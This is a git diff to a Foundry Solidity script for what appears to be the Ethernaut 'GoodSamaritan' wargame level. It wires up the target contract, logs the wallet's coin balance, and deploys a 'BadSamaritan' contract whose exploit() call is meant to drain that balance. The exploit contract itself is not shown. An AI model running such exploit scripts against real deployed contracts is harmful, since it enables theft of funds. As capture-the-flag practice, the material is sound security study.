@@ -4,6 +4,7 @@ pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?
 import "forge-std/Script.sol";
 import "forge-std/console2.sol";
 import "src/GoodSamaritan/GoodSamaritan.sol";
+import "./BadSamaritan.sol";
 
 contract GoodSamaritanScript is Script {
 
@@ -21,7 +22,7 @@ contract GoodSamaritanScript is Script {
             /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
             attacker = msg.sender;
             /** Setup contract and required init (you may have to modify this section) **/
-            // target = GoodSamaritan(0x0000000000000000000000000000000000000000); //attach to an existing contract
+            target = GoodSamaritan(0x0000000000000000000000000000000000000000); //attach to an existing contract
         }else{ // local - chainid = 31137
             /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
             deployer = vm.addr(1);
@@ -33,7 +34,7 @@ contract GoodSamaritanScript is Script {
             vm.deal(attacker, 0.5 ether);
             /** Setup contract and required init (you may have to modify this section) **/
             vm.startBroadcast(deployer);
-            // target = new GoodSamaritan();
+            target = new GoodSamaritan();
             vm.stopBroadcast();
         }
     }
@@ -45,5 +46,17 @@ contract GoodSamaritanScript is Script {
     function run() public {
         console.log("[Info]");
         console.log("attacker : %s", attacker);
+        Wallet wallet = Wallet(target.wallet());
+        Coin coin = Coin(target.coin());
+        console.log("Wallet   : %s", address(wallet));
+        console.log("Coin     : %s", address(coin));
+        console.log("Balance  : %s", coin.balances(address(wallet)));
+
+        console.log("[Exploit]");
+        vm.startBroadcast(attacker);
+        BadSamaritan badboi = new BadSamaritan();
+        badboi.exploit(address(target));
+        vm.stopBroadcast();
+        console.log("Balance  : %s", coin.balances(address(wallet)));
     }
 }
